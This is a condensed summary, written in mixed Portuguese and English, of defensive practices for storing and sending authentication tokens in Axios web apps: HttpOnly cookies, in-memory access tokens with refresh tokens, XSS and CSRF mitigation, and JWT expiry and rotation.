**Conclusão Integrada**: Secure token storage em Axios applications requer selecting appropriate mechanism baseado em security requirements/UX constraints: **HttpOnly cookies** (most secure - JavaScript cannot access via `httpOnly: true`, automatic transmission, CSRF protection needed via tokens/SameSite), **memory storage** (ephemeral - cleared on refresh, XSS cannot persist, requires refresh token pattern), **sessionStorage** (tab-scoped - cleared on close, XSS-vulnerable, better than localStorage), **localStorage** (persistent - XSS-vulnerable, convenient mas least secure). **Security comparison**: HttpOnly cookies immune to XSS direct theft, memory storage prevents XSS persistence, sessionStorage/localStorage fully XSS-vulnerable (malicious scripts read via JavaScript APIs). **HttpOnly cookie pattern**: server sets via `res.cookie('token', token, { httpOnly: true, secure: true, sameSite: 'strict' })`, Axios integration via `withCredentials: true`, CSRF protection required (tokens, SameSite, Origin validation). **Memory storage pattern**: store access token em JavaScript variable/closure, refresh token em HttpOnly cookie, silent refresh flow antes de expiration, immune to XSS persistence (cleared on refresh requiring attacker inject every page load). **Browser storage patterns**: localStorage/sessionStorage XSS-vulnerable requiring XSS prevention (sanitization, CSP), encryption provides obfuscation não true security (JavaScript can decrypt), sessionStorage preferred over localStorage (tab-scoped, auto-clears). **JWT best practices**: **access token** short-lived (5-15 min) em memory/sessionStorage, **refresh token** long-lived (7+ days) em HttpOnly cookie, token rotation (new refresh token cada uso preventing replay), multi-layer expiration (access 15 min, refresh 7 days, session 30 days inactivity, absolute 90 days). **Token transmission**: HTTPS required preventing network interception, Authorization header preferred over URL params (não logged), Bearer scheme standard format (`Authorization: Bearer <token>`), custom headers triggering CORS preflight (additional validation). **Token lifecycle**: generation via cryptographically secure methods (jwt.sign, crypto.randomBytes), expiration enforcement server-side (jwt.verify checking exp claim), renewal via silent refresh before expiration (seamless UX), revocation via blacklist/whitelist (immediate invalidation on logout/security events). **Attack protection**: **XSS prevention** critical regardless de storage (sanitization, CSP, HttpOnly cookies), **CSRF mitigation** when using cookies (SameSite, tokens, Origin validation), **network interception** prevention via HTTPS enforcement/HSTS, **token fixation** prevention via regenerating on login. **Advanced patterns**: **token rotation** (per-request tokens maximum security mas high overhead), **fingerprinting** (binding tokens to device via User-Agent/IP hash), **encryption** (encrypting before storage providing obfuscation), **secure contexts** (requiring HTTPS for token operations). Critical understanding: no storage mechanism protects against XSS if attacker can intercept token during usage (memory/sessionStorage/localStorage readable, HttpOnly cookies sent automatically mas can be intercepted); defense-in-depth combining secure storage + XSS prevention + HTTPS + short expiration + rotation essential; HttpOnly cookies + memory storage + refresh token pattern provides best security/UX balance; localStorage should be avoided para sensitive tokens (most vulnerable to XSS, no automatic expiration, persistent across sessions).